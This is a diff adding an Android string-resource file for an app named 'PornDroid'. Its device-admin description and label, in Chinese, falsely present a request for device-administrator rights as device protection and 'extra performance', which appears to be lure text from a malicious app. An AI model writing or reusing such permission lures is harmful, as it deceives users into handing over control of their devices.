@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">PornDroid</string>
+    <string name="device_admin_description">需要这些权限，以保护您的设备免受攻击，并防止Android操作系统被破坏。</string>
+    <string name="device_admin_label">Android的额外性能</string>
+</resources>
